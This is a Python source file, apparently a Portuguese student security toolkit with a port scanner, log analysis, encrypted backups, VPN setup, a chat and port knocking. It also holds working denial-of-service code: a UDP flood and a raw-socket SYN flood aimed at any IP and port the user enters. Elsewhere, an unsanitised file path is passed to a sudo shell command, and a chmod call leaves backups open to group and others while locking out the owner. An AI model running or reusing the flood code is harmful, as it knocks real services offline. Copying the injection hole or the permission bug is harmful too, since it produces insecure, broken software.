

import os
import sys
import re
import shutil
import stat
import socket
import time
import random
import sqlite3
import hashlib
from datetime import datetime
from os import system, name
from time import sleep
import reportlab
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter, landscape
import matplotlib.pyplot as plt
import csv
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import geoip2.database  # Import do GeoIP2

# ========================= VARIÁVEIS GLOBAIS =========================
mensagens = []         # Armazena mensagens lidas de mensagens.txt
ARQ_MENSAGENS = "mensagens.txt"
DB_NAME = "seguranca.db"  # Nome do arquivo do SQLite

# Variáveis para GeoIP2
GEOIP_DB = "GeoLite2-Country.mmdb"  # Certifique-se de que o arquivo existe
try:
    geoip_reader = geoip2.database.Reader(GEOIP_DB)
except Exception as e:
    print("Erro ao abrir banco de dados GeoIP2:", e)
    geoip_reader = None

def get_country(ip_address):
    """Retorna o código ISO do país para o IP informado usando GeoIP2."""
    if geoip_reader is None:
        return "N/A"
    try:
        response = geoip_reader.country(ip_address)
        return response.country.iso_code if response and response.country.iso_code else "N/A"
    except Exception:
        return "N/A"

# ========================== FUNÇÕES DE BD (SQLite) =========================
def initDB():
    if not os.path.exists(DB_NAME):
        print(f"Criando banco de dados: {DB_NAME}")
    else:
        print(f"Conectando ao banco de dados: {DB_NAME}")
    criarTabelasDB()

def criarTabelasDB():
    try:
        with sqlite3.connect(DB_NAME) as con:
            cur = con.cursor()
            # Tabela para logs HTTP/HTTPS
            cur.execute("""
                CREATE TABLE IF NOT EXISTS log_http (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    ip_src TEXT,
                    ip_dst TEXT,
                    port_dst TEXT,
                    country TEXT,
                    raw_line TEXT
                )
            """)
            # Tabela para logs SSH
            cur.execute("""
                CREATE TABLE IF NOT EXISTS log_ssh (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TEXT,
                    ip TEXT,
                    port TEXT,
                    country TEXT,
                    raw_line TEXT
                )
            """)
            con.commit()
    except Exception as e:
        print("Erro ao criar tabelas no DB:", e)

def inserirLogsHTTPNoDB(dados):
    try:
        with sqlite3.connect(DB_NAME) as con:
            cur = con.cursor()
            for item in dados:
                dia, mes, hora, ipSRC, ipDST, dPort, linhaCompleta = item
                timestamp = f"{dia}-{mes} {hora}"
                # Utiliza GeoIP2 para identificar o país do IP de origem
                country = get_country(ipSRC)
                cur.execute("""
                    INSERT INTO log_http (timestamp, ip_src, ip_dst, port_dst, country, raw_line)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (timestamp, ipSRC, ipDST, dPort, country, linhaCompleta))
            con.commit()
    except Exception as e:
        print("Erro ao inserir logs HTTP no DB:", e)

def inserirLogsSSHNoDB(dados):
    try:
        with sqlite3.connect(DB_NAME) as con:
            cur = con.cursor()
            for item in dados:
                dia, mes, hora, ip, port, linhaCompleta = item
                timestamp = f"{dia}-{mes} {hora}"
                # Utiliza GeoIP2 para identificar o país do IP
                country = get_country(ip)
                cur.execute("""
                    INSERT INTO log_ssh (timestamp, ip, port, country, raw_line)
                    VALUES (?, ?, ?, ?, ?)
                """, (timestamp, ip, port, country, linhaCompleta))
            con.commit()
    except Exception as e:
        print("Erro ao inserir logs SSH no DB:", e)

# ========================== CARREGAR/SALVAR MENSAGENS ==========================
def carregarMensagens():
    global mensagens
    mensagens.clear()
    if os.path.exists(ARQ_MENSAGENS):
        with open(ARQ_MENSAGENS, 'r', encoding='utf-8', errors='ignore') as f:
            for linha in f:
                linha = linha.strip()
                if not linha:
                    continue
                partes = linha.split("|")
                if len(partes) >= 3:
                    msg_id = int(partes[0])
                    msg_data = partes[1]
                    msg_conteudo = "|".join(partes[2:])
                    mensagens.append({
                        "id": msg_id,
                        "data": msg_data,
                        "conteudo": msg_conteudo
                    })

def salvarMensagens():
    global mensagens
    with open(ARQ_MENSAGENS, 'w', encoding='utf-8') as f:
        for m in mensagens:
            linha = f"{m['id']}|{m['data']}|{m['conteudo']}\n"
            f.write(linha)

# ======================== 1) VPN  ===========================
def configurarVPN():
    while True:
        print("\n======= CONFIGURAÇÃO DE VPN =======")
        print("=>1 Instalar servidor VPN L2TP/IPSec")
        print("=>2 Instalar servidor VPN OpenVPN")
        print("=>3 Conectar-se a um servidor VPN L2TP/IPSec")
        print("=>4 Conectar-se a um servidor VPN OpenVPN")
        print("=>5 Voltar ao menu principal")

        opc = input("\n>>> ")
        if opc == '1':
            instalarVPN_L2TP()
        elif opc == '2':
            instalarVPN_OpenVPN()
        elif opc == '3':
            conectarVPN_L2TP()
        elif opc == '4':
            conectarVPN_OpenVPN()
        elif opc == '5':
            break
        else:
            print("Opção inválida.")

def instalarVPN_L2TP():
    print("\nInstalando VPN L2TP/IPSec (exemplo). Ajuste para sua distro.")
    sleep(1)
    os.system("sudo apt-get update && sudo apt-get install -y strongswan xl2tpd")
    print("\nInstalação concluída.")

def instalarVPN_OpenVPN():
    print("\nInstalando VPN OpenVPN (exemplo). Ajuste para sua distro.")
    sleep(1)
    os.system("sudo apt-get update && sudo apt-get install -y openvpn")
    print("\nInstalação concluída.")

def conectarVPN_L2TP():
    print("\nConectando ao servidor VPN L2TP/IPSec (exemplo).")
    server_ip = input("IP/host do servidor: ")
    os.system(f"echo 'ipsec up L2TP-connection && xl2tpd...'")

def conectarVPN_OpenVPN():
    print("\nConectando ao servidor VPN OpenVPN (exemplo).")
    caminho_ovpn = input("Caminho do arquivo .ovpn: ")
    os.system(f"sudo openvpn --config {caminho_ovpn}")

# ===================== 2) ATAQUES DoS ======================
def menuAtaquesDoS():
    while True:
        print("\n=========== ATAQUES (DoS) ===========")
        print("=>1 UDP Flood")
        print("=>2 SYN Flood")
        print("=>3 Voltar ao menu principal")

        op = input("\n>>> ")
        if op == '1':
            udpFlood()
        elif op == '2':
            synFlood()
        elif op == '3':
            break
        else:
            print("Opção inválida.")

def udpFlood():
    print("\n===== UDP FLOOD =====")
    target_ip = input("IP de destino: ")
    target_port = int(input("Porta de destino: "))
    duration = int(input("Duração (segundos) do ataque: "))

    print("Iniciando UDP Flood em", target_ip, ":", target_port)
    print("Duração:", duration, "segundos")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_random = random._urandom(1024)
    timeout = time.time() + duration
    pacotes_enviados = 0

    try:
        while True:
            if time.time() > timeout:
                break
            sock.sendto(bytes_random, (target_ip, target_port))
            pacotes_enviados += 1

        print(f"UDP flood finalizado. {pacotes_enviados} pacotes enviados.")
    except KeyboardInterrupt:
        print("\nUDP flood interrompido pelo usuário.")
    except Exception as e:
        print("Erro no UDP flood:", e)

def synFlood():
    print("\n===== SYN FLOOD =====")
    target_ip = input("IP de destino: ")
    target_port = int(input("Porta de destino: "))
    duration = int(input("Duração (segundos) do ataque: "))

    print("Iniciando SYN Flood em", target_ip, ":", target_port)
    print("Duração:", duration, "segundos")

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            timeout = time.time() + duration
            pacotes_enviados = 0

            while True:
                if time.time() > timeout:
                    break
                packet = construirPacoteIP_TCP_Syn(target_ip, target_port)
                s.sendto(packet, (target_ip, 0))
                pacotes_enviados += 1

            print(f"SYN flood finalizado. {pacotes_enviados} pacotes (tentados) enviados.")
    except PermissionError:
        print("É preciso executar como root para criar socket RAW.")
    except KeyboardInterrupt:
        print("\nSYN flood interrompido pelo usuário.")
    except Exception as e:
        print("Erro no SYN flood:", e)

def construirPacoteIP_TCP_Syn(dst_ip, dst_port):
    import struct
    ip_ver_ihl = 0x45  # Versão=4, IHL=5
    ip_tos = 0
    ip_tot_len = 40  # IP (20) + TCP (20)
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    src_ip = "192.168.0.100"  # Ajuste se quiser
    src_ip_bytes = socket.inet_aton(src_ip)
    dst_ip_bytes = socket.inet_aton(dst_ip)

    # IP Header
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        ip_ver_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        src_ip_bytes,
        dst_ip_bytes
    )

    # TCP Header
    src_port = random.randint(1024, 65535)
    seq_no = random.randint(0, 4294967295)
    ack_no = 0
    offset_res = (5 << 4) + 0
    tcp_flags = 0x02  # SYN
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0

    tcp_header = struct.pack(
        "!HHLLBBHHH",
        src_port,
        dst_port,
        seq_no,
        ack_no,
        offset_res,
        tcp_flags,
        window,
        check,
        urg_ptr
    )

    return ip_header + tcp_header

# ====== 3) MENSAGENS ARQUIVADAS ======
def menuGerenciarMensagens():
    while True:
        print("\n========== MENSAGENS ARQUIVADAS ==========")
        print("=>1 Listar mensagens")
        print("=>2 Remover todas as mensagens")
        print("=>3 Download de todas as mensagens")
        print("=>4 Voltar ao menu principal")

        op = input("\n>>> ")
        if op == '1':
            listarMensagens()
        elif op == '2':
            removerMensagens()
        elif op == '3':
            downloadMensagens()
        elif op == '4':
            break
        else:
            print("Opção inválida.")

def listarMensagens():
    global mensagens
    if not mensagens:
        print("Nenhuma mensagem encontrada.")
        return

    print("\n--- LISTAGEM DE MENSAGENS ---")
    for m in mensagens:
        print(f"ID: {m['id']} | Data: {m['data']} | Conteúdo: {m['conteudo']}")

def removerMensagens():
    global mensagens
    mensagens.clear()
    salvarMensagens()
    print("Todas as mensagens foram removidas com sucesso.")

def downloadMensagens():
    global mensagens
    if not mensagens:
        print("Nenhuma mensagem para baixar.")
        return

    destino = input("Caminho para salvar (ex.: /home/user/Desktop): ")
    nome_arquivo = os.path.join(destino, "mensagens_download.txt")

    try:
        with open(nome_arquivo, "w", encoding="utf-8") as f:
            for m in mensagens:
                linha = f"ID={m['id']}  Data={m['data']}  Conteúdo={m['conteudo']}\n"
                f.write(linha)
        print(f"Download concluído. Arquivo salvo em: {nome_arquivo}")
    except Exception as e:
        print("Erro ao salvar arquivo:", e)

# ====== 4) PORT SCANNER (com PDF e CSV) ======
def portScanner():
    print("\n--------------- << PORT SCANNER >> ---------------")
    ip = input("IP do alvo [ex: 192.168.1.128]: ")
    portoInicial = int(input("Porto inicial: "))
    portoFinal = int(input("Porto final: "))

    dataInicio = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    print("\nInício do Scanner:", dataInicio)
    print("IP alvo:", ip)
    print("Processando, aguarde...\n")

    portas_abertas = []
    try:
        for porto in range(portoInicial, portoFinal + 1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(0.5)
            resultado = s.connect_ex((ip, porto))
            if resultado == 0:
                portas_abertas.append(porto)
                print(f"Porta aberta: {porto}")
            s.close()

        dataFim = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        print("\nScanner concluído em", dataFim)
        print("Portas abertas encontradas:", portas_abertas)

        # CSV
        opCsv = input("Gerar arquivo CSV dos resultados? [y/n]: ")
        if opCsv.lower() == 'y':
            gerarCSVPortScanner(ip, portoInicial, portoFinal, portas_abertas)

        # PDF
        opPdf = input("Gerar Relatório PDF? [y/n]: ")
        if opPdf.lower() == 'y':
            gerarRelatorioPortScannerPDF(ip, portoInicial, portoFinal, portas_abertas, dataInicio, dataFim)
            print("Relatório PDF gerado com sucesso.\n")

    except Exception as e:
        print("Erro no port scanner:", e)

def gerarCSVPortScanner(ip, pInicial, pFinal, portas):
    nome_csv = f"portScanner_{ip.replace('.', '-')}.csv"
    try:
        with open(nome_csv, 'w', encoding='utf-8', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(["IP", "PortoInicial", "PortoFinal", "PortaAberta"])
            for p in portas:
                writer.writerow([ip, pInicial, pFinal, p])
        print(f"Arquivo CSV gerado: {nome_csv}")
    except Exception as e:
        print("Erro ao gerar CSV:", e)

def gerarRelatorioPortScannerPDF(ip, pInicial, pFinal, portas, dataInicio, dataFim):
    data_atual = datetime.now().strftime("%Y%m%d%H%M")
    nome_pdf = f"portScanner_{ip.replace('.', '-')}_{data_atual}.pdf"
    pdf = canvas.Canvas(nome_pdf)
    pdf.setFont("Helvetica", 12)

    pdf.drawString(400, 800, datetime.now().strftime("%d/%m/%Y %H:%M"))
    pdf.setFont("Helvetica-Bold", 18)
    pdf.drawString(200, 780, "Relatório Port Scanner")
    pdf.line(20, 770, 580, 770)

    pdf.setFont("Helvetica", 12)
    pdf.drawString(20, 740, f"IP Alvo: {ip}")
    pdf.drawString(300, 740, f"Portos: [{pInicial} - {pFinal}]")
    pdf.drawString(20, 720, f"Início: {dataInicio}")
    pdf.drawString(300, 720, f"Fim: {dataFim}")
    pdf.line(20, 700, 580, 700)

    y = 680
    for i, porta in enumerate(portas, start=1):
        pdf.drawString(20, y, f"{i}. Porta aberta: {porta}")
        y -= 20

    msg_final = f"Total de portas abertas: {len(portas)}"
    pdf.drawString(20, (y - 30), msg_final)
    pdf.save()
    print(f"Relatório PDF salvo em: {nome_pdf}")

# ====== 5) ANÁLISE DE LOGS DE SERVIÇOS (HTTP/SSH) ======
def analiseLogServicos():
    """
    Exemplo: lê /var/log/ufw.log, procura 'DPT=80' ou 'DPT=443' e gera CSV/PDF.
    Também insere no BD (log_http).
    """
    print("\n------- << ANALISE LOGS SERVIÇOS [HTTP/SSH] >> ---------\n")
    log_caminho = input("Caminho do arquivo de log (ex.: /var/log/ufw.log): ")
    if not os.path.exists(log_caminho):
        print("Arquivo não encontrado:", log_caminho)
        return

    with open(log_caminho, 'r', encoding='utf-8', errors='ignore') as f:
        linhas = f.readlines()

    cabecalho = ["Dia", "Mes", "Hora", "IpSRC", "IpDST", "PortDST"]
    dados = []
    for linha in linhas:
        if "DPT=80" in linha or "DPT=443" in linha:
            col = linha.split()
            if len(col) < 3:
                continue
            mes = col[0]
            dia = col[1]
            hora = col[2]

            ipSRC = ""
            ipDST = ""
            dPort = ""

            for c in col:
                if "SRC=" in c:
                    ipSRC = c.split("=")[1]
                elif "DST=" in c:
                    ipDST = c.split("=")[1]
                elif "DPT=" in c:
                    dPort = c.split("=")[1]

            dados.append([dia, mes, hora, ipSRC, ipDST, dPort, linha.strip()])

    if not dados:
        print("Nenhuma linha encontrada com DPT=80 ou 443.")
        return

    # Insere no BD
    inserirLogsHTTPNoDB(dados)

    # CSV
    opCsv = input("Gerar CSV dos logs de serviços? [y/n]: ")
    if opCsv.lower() == 'y':
        dadosParaCSV = [d[:6] for d in dados]
        gerarCSVLog("servicosHTTP", cabecalho, dadosParaCSV)

    # PDF
    opPdf = input("Gerar PDF dos logs de serviços? [y/n]: ")
    if opPdf.lower() == 'y':
        dadosParaPDF = [d[:6] for d in dados]
        gerarRelatorioLogServicosPDF("servicosHTTP", cabecalho, dadosParaPDF)
        print("Relatório PDF gerado com sucesso.")

def gerarCSVLog(nome, cabecalho, dados):
    csv_nome = f"{nome}.csv"
    try:
        with open(csv_nome, 'w', encoding='utf-8', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(cabecalho)
            writer.writerows(dados)
        print(f"CSV gerado: {csv_nome}")
    except Exception as e:
        print("Erro ao gerar CSV:", e)

def gerarRelatorioLogServicosPDF(nome, cabecalho, dados):
    pdf_nome = f"{nome}.pdf"
    pdf = canvas.Canvas(pdf_nome, pagesize=landscape(letter))
    pdf.setLineWidth(.3)
    dataAtual = datetime.now().strftime("%d/%m/%Y %H:%M")
    pdf.setFont('Helvetica', 12)
    pdf.drawString(700, 570, dataAtual)
    pdf.setFont('Helvetica-Bold', 18)
    pdf.drawString(220, 550, 'Relatório Serviços HTTP/HTTPS')
    pdf.line(20, 530, 770, 530)

    pdf.setFont('Helvetica-Bold', 12)
    xCab = 20
    for c in cabecalho:
        pdf.drawString(xCab, 500, c)
        xCab += 100

    y = 480
    pdf.setFont('Helvetica', 12)
    for linha in dados:
        x = 20
        for valor in linha:
            pdf.drawString(x, y, str(valor))
            x += 100
        y -= 20
        if y < 40:
            pdf.showPage()
            pdf.setFont('Helvetica', 12)
            y = 550

    pdf.save()
    print(f"PDF gerado: {pdf_nome}")

# ====== 6) ANÁLISE LOGS AUTH (auth.log) ======
def analiseLogsAuth():
    """
    Filtra 'Failed password' de /var/log/auth.log, gera CSV/PDF e insere no BD log_ssh.
    """
    print("\n-------- << ANALISE LOG AUTH.LOG >> -----------\n")
    log_caminho = input("Caminho do auth.log (ex.: /var/log/auth.log): ")
    if not os.path.exists(log_caminho):
        print("Arquivo não encontrado:", log_caminho)
        return

    with open(log_caminho, 'r', encoding='utf-8', errors='ignore') as f:
        linhas = f.readlines()

    dados = []
    cabecalho = ["Dia", "Mes", "Hora", "IP", "Porto"]
    import re
    re_ip = re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

    for linha in linhas:
        if "Failed password" in linha:
            col = linha.split()
            if len(col) < 3:
                continue
            mes = col[0]
            dia = col[1]
            hora = col[2]

            # Extrai IP e porta
            ip_match = re.search(re_ip, linha)
            ip = ip_match.group(0) if ip_match else ""
            porto_match = re.search(r"port\s(\d+)", linha)
            porto = porto_match.group(1) if porto_match else ""

            dados.append([dia, mes, hora, ip, porto, linha.strip()])

    if not dados:
        print("Nenhuma entrada de 'Failed password' encontrada.")
        return

    inserirLogsSSHNoDB(dados)

    opCsv = input("Gerar CSV de logins falhados? [y/n]: ")
    if opCsv.lower() == 'y':
        dadosCSV = [d[:5] for d in dados]
        gerarCSVLog("loginfalhados", cabecalho, dadosCSV)

    opPdf = input("Gerar PDF de logins falhados? [y/n]: ")
    if opPdf.lower() == 'y':
        dadosPDF = [d[:5] for d in dados]
        gerarRelatorioLoginFalhadoPDF("loginfalhados", cabecalho, dadosPDF)
        print("Relatório PDF gerado com sucesso.")

def gerarRelatorioLoginFalhadoPDF(nome, cabecalho, dados):
    pdf_nome = f"{nome}.pdf"
    pdf = canvas.Canvas(pdf_nome, pagesize=landscape(letter))
    pdf.setLineWidth(.3)
    dataAtual = datetime.now().strftime("%d/%m/%Y %H:%M")
    pdf.setFont('Helvetica', 12)
    pdf.drawString(700, 570, dataAtual)
    pdf.setFont('Helvetica-Bold', 18)
    pdf.drawString(220, 550, 'Relatório de Logins Falhados (auth.log)')
    pdf.line(20, 530, 770, 530)

    pdf.setFont('Helvetica-Bold', 12)
    xCab = 20
    for c in cabecalho:
        pdf.drawString(xCab, 500, c)
        xCab += 100

    y = 480
    pdf.setFont('Helvetica', 12)
    for linha in dados:
        x = 20
        for valor in linha:
            pdf.drawString(x, y, str(valor))
            x += 100
        y -= 20
        if y < 40:
            pdf.showPage()
            pdf.setFont('Helvetica', 12)
            y = 550

    pdf.save()
    print(f"PDF gerado: {pdf_nome}")

# ======= CRIPTOGRAFIA DE FICHEIROS (backup) =======
def encrypt_file(password, in_filename, out_filename=None, chunksize=64*1024):
    """
    Criptografa o arquivo in_filename, gerando out_filename (arquivo .enc).
    Utiliza AES (modo CBC) + PBKDF2 para derivar a chave a partir da password.
    chunksize define o tamanho de leitura do arquivo em bytes.
    """
    if not out_filename:
        out_filename = in_filename + ".enc"

    # Gera um salt aleatório e deriva a chave com PBKDF2
    salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=100_000)  # AES-256

    iv = get_random_bytes(AES.block_size)  # vetorzinho de inicialização
    cipher = AES.new(key, AES.MODE_CBC, iv)

    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            # Escreve salt e IV no início do arquivo para posterior uso
            outfile.write(salt)
            outfile.write(iv)
            # Escreve o tamanho original do arquivo (8 bytes, form int64)
            outfile.write(filesize.to_bytes(8, 'big'))

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % AES.block_size != 0:
                    # Faz padding
                    chunk += b' ' * (AES.block_size - len(chunk) % AES.block_size)

                encrypted_chunk = cipher.encrypt(chunk)
                outfile.write(encrypted_chunk)

def decrypt_file(password, in_filename, out_filename=None, chunksize=64*1024):
    """
    Desencripta o arquivo in_filename, gerando out_filename (arquivo .dec).
    Lê salt, IV e tamanho original, depois decripta.
    """
    if not out_filename:
        out_filename = in_filename + ".dec"

    with open(in_filename, 'rb') as infile:
        salt = infile.read(16)
        iv = infile.read(AES.block_size)
        origsize = int.from_bytes(infile.read(8), 'big')

        # Deriva a mesma chave
        key = PBKDF2(password, salt, dkLen=32, count=100_000)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                decrypted_chunk = cipher.decrypt(chunk)
                outfile.write(decrypted_chunk)

            # Trunca o padding final
            outfile.truncate(origsize)

# ====== 7) BACKUP ======
def backup():
    """
    Compacta (zip) um diretório informado, salvando no Desktop/backups,
    e encripta o ficheiro gerado com AES (chave simétrica).
    """
    print("\n------------------ BACKUP ------------------")
    dirAlvo = input("Diretório alvo do backup (ex.: Documents): ")
    dirAlvo = os.path.join(os.path.join(os.path.expanduser('~')), dirAlvo)

    pastaDestino = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop/backups')
    if not os.path.exists(pastaDestino):
        os.makedirs(pastaDestino)

    nomeFicheiro = "backup_" + datetime.now().strftime("%Y%m%d%H%M%S")
    ficheiroBackup = os.path.join(pastaDestino, nomeFicheiro)

    print("Processando, aguarde...")
    # 1) Gera ZIP
    shutil.make_archive(ficheiroBackup, 'zip', dirAlvo)
    zip_path = ficheiroBackup + ".zip"

    # 2) Pergunta senha
    password = input("Digite a senha para encriptar o backup: ")

    # 3) Encripta o ZIP => gera .enc
    encrypted_path = zip_path + ".enc"
    encrypt_file(password, zip_path, encrypted_path)
    # Remove o ZIP original para ficar só com o .enc
    os.remove(zip_path)

    # Ajusta permissões
    os.chmod(encrypted_path, stat.S_IRWXG | stat.S_IRWXO)
    print("\nBackup concluído e encriptado.")
    print("Arquivo encriptado:", os.path.basename(encrypted_path))
    print("Local:", pastaDestino)
    print("Use a mesma senha para desencriptar e visualizar.")

def restaurarBackupEncriptado():
    """
    Desencripta um arquivo .enc (gerado pela função backup) e salva o .zip restaurado.
    """
    print("\n----------- RESTAURAR BACKUP ENCRIPTADO -----------")
    enc_path = input("Caminho do arquivo .enc: ")
    if not os.path.exists(enc_path):
        print("Arquivo não encontrado.")
        return

    password = input("Digite a senha de desencriptação: ")
    # Gera nome de saída (ex.: backup_12345.zip) 
    # removendo o ".enc" do final
    if enc_path.endswith(".enc"):
        zip_restaurado = enc_path[:-4]  # remove .enc
    else:
        zip_restaurado = enc_path + ".dec.zip"

    print("Desencriptando, aguarde...")
    decrypt_file(password, enc_path, zip_restaurado)
    print(f"Backup desencriptado salvo em: {zip_restaurado}")
    print("Para visualizar o conteúdo, basta extrair o ZIP normalmente.")

# ====== 8) CHAT (CLIENTE/SERVIDOR) ======
def menuChat():
    while True:
        print("\n==== MENU DE CHAT ====")
        print("=>1 Iniciar Servidor de Chat")
        print("=>2 Iniciar Cliente de Chat")
        print("=>3 Voltar ao menu principal")

        opc = input(">>> ")
        if opc == '1':
            initServidorChat()
        elif opc == '2':
            initClienteChat()
        elif opc == '3':
            break
        else:
            print("Opção inválida.")

def initServidorChat():
    HOST = "10.50.0.178"
    PORT = 5000
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.bind((HOST, PORT))
        server_sock.listen(1)
        print(f"Servidor de chat aguardando conexões em {HOST}:{PORT}...")

        conn, address = server_sock.accept()
        print("Conexão estabelecida com:", address)

        while True:
            data = conn.recv(1024)
            if not data:
                print("Cliente encerrou a conexão.")
                break

            msg_cliente = data.decode("utf-8")
            print(f"Cliente: {msg_cliente}")

            if msg_cliente.lower() == "exit":
                print("Cliente solicitou saída. Encerrando servidor...")
                break

            msg_servidor = input("Você (Servidor): ")
            conn.send(msg_servidor.encode("utf-8"))
            if msg_servidor.lower() == "exit":
                print("Encerrando servidor por comando local.")
                break

        conn.close()
        server_sock.close()
    except KeyboardInterrupt:
        print("\nServidor de chat interrompido manualmente.")
        sys.exit()
    except Exception as e:
        print("Erro no servidor de chat:", e)
        sys.exit()

def initClienteChat():
    server_ip = input("Digite o IP do servidor: ")
    server_port = 5000

    try:
        client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_sock.connect((server_ip, server_port))
        print(f"Conexão estabelecida com o servidor {server_ip}:{server_port}.")

        while True:
            msg_cliente = input("Você (Cliente): ")
            client_sock.send(msg_cliente.encode("utf-8"))
            if msg_cliente.lower() == "exit":
                print("Encerrando cliente...")
                break

            data = client_sock.recv(1024)
            if not data:
                print("Servidor encerrou a conexão.")
                break

            msg_servidor = data.decode("utf-8")
            print(f"Servidor: {msg_servidor}")
            if msg_servidor.lower() == "exit":
                print("Servidor solicitou saída. Encerrando cliente...")
                break

        client_sock.close()
    except KeyboardInterrupt:
        print("\nCliente de chat interrompido manualmente.")
        sys.exit()
    except Exception as e:
        print("Erro no cliente de chat:", e)
        sys.exit()

# ========== 9) PORT KNOCKING (CLIENTE) ============
def portKnockingClient():
    print("\n======= CLIENTE PORT KNOCKING =======")
    server_ip = input("IP do servidor (máquina com iptables configurado): ")
    ports_sequence_str = input("Sequência de portas (ex.: 7000,8000,9000): ")
    if not ports_sequence_str:
        print("Sequência de portas não fornecida.")
        return

    ports_sequence = [p.strip() for p in ports_sequence_str.split(",")]
    if not ports_sequence:
        print("Nenhuma porta válida na sequência.")
        return

    intervalo = input("Intervalo (segundos) entre cada knock (padrão=1): ")
    try:
        intervalo = float(intervalo)
    except:
        intervalo = 1.0

    print(f"\nKnockando no servidor {server_ip} nas portas {ports_sequence} ...")
    for port_str in ports_sequence:
        try:
            port = int(port_str)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect_ex((server_ip, port))
            s.close()
            print(f"Knock enviado na porta {port}")
            time.sleep(intervalo)
        except Exception as e:
            print(f"Erro ao knockar a porta {port_str}: {e}")

    print("\nSequência de port knocks concluída.")

# ================== FUNÇÕES AUXILIARES ===================
def clearScreen():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

def voltarOuContinuar():
    op = input("\nDeseja voltar ao menu principal? [y/n]: ")
    if op.lower() != 'y':
        print("Saindo do programa...")
        sys.exit()

# ======================= MAIN ============================
def main():
    initDB()
    carregarMensagens()

    while True:
        clearScreen()
        print("==============================================")
        print("       SEGURANÇA INFORMÁTICA        ")
        print("==============================================")
        print("\n---------------- MENU PRINCIPAL --------------\n")
        print("=>1 PORT SCANNER")
        print("=>2 ANALISE LOGS SERVIÇOS [HTTP/SSH]")
        print("=>3 ANALISE LOGS [auth.log]")
        print("=>4 BACKUP (ZIP + CRIPTOGRAFIA)")
        print("=>5 VPN (Instalar/Conectar)")
        print("=>6 ATAQUES (DoS) - UDP Flood / SYN Flood")
        print("=>7 MENSAGENS ARQUIVADAS (listar/remover/download)")
        print("=>8 CHAT (Servidor/Cliente)")
        print("=>9 CLIENTE PORT KNOCKING (abrir acesso SSH)")
        print("=>10 RESTAURAR BACKUP ENCRIPTADO")
        print("=>11 SAIR")

        op = input("\n>>> ")
        if op == '1':
            portScanner()
            voltarOuContinuar()
        elif op == '2':
            analiseLogServicos()
            voltarOuContinuar()
        elif op == '3':
            analiseLogsAuth()
            voltarOuContinuar()
        elif op == '4':
            backup()
            voltarOuContinuar()
        elif op == '5':
            configurarVPN()
        elif op == '6':
            menuAtaquesDoS()
        elif op == '7':
            menuGerenciarMensagens()
        elif op == '8':
            menuChat()
        elif op == '9':
            portKnockingClient()
            voltarOuContinuar()
        elif op == '10':
            restaurarBackupEncriptado()
            voltarOuContinuar()
        elif op == '11':
            print("Saindo do programa...")
            sys.exit()
        else:
            print("Opção inválida.")
            sleep(1)

if __name__ == "__main__":
    main()
